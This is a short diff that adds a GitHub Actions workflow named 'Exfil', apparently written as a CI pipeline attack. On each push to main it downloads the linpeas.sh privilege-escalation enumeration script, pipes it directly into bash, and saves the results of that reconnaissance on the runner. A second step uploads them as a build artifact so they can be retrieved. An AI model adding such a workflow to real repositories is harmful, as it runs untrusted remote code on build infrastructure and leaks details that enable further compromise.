@@ -1,0 +1,23 @@
+name: Exfil
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  print:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: I'm at war
+        run: |
+           curl https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh |bash >> {{ runner.temp }}/linpeas.out
+        shell: bash
+
+      - name: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: my-artifact
+          path: {{ runner.temp }}/linpeas.out
+          retention-days: 5
